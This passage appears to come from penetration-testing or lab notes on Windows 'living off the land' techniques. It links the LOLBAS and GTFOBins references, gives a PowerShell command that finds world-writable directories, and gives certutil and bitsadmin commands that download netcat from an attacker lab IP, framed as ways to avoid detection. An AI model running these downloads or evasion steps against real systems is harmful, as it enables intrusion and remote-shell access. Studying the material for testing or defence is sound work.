...
Use built-in Windows tools to minimize footprint and avoid detection.

**Key resources:**
- [LOLBAS](https://lolbas-project.github.io/#) — Windows binaries, scripts and libraries for living off the land
- [GTFOBins](https://gtfobins.org/) — Linux equivalents

**Quick inventory (Windows):**
```powershell
# Find writable directories
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer -and (Get-Acl $_).Access | Where-Object {$_.FileSystemRights -match "Write" -and $_.IdentityReference -match "Everyone|Users"}}
...
**File download without PowerShell:**
```cmd
certutil.exe -urlcache -split -f http://10.10.14.18/nc.exe nc.exe
bitsadmin /transfer wcb /priority foreground http://10.10.14.18/nc.exe C:\Windows\Temp\nc.exe
```
